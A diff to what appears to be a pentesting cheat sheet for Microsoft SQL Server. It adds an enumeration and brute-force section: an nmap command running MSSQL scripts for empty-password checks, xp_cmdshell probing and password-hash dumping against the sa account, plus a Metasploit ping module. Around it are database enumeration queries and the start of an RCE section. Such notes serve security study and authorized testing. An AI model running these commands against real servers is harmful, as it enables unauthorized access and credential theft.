@@ -16,6 +16,13 @@ SELECT name FROM sys.databases;
 SELECT * FROM offsec.information_schema.tables; 
 select * from offsec.dbo.users;
 ```
+## Enumeration/BruteForce
+```bash
+nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
+#同一用户名错误猜测多次可能会被封禁
+
+msf> use auxiliary/scanner/mssql/mssql_ping
+```
 ## RCE
 ```bash
 EXECUTE sp_configure 'show advanced options', 1;
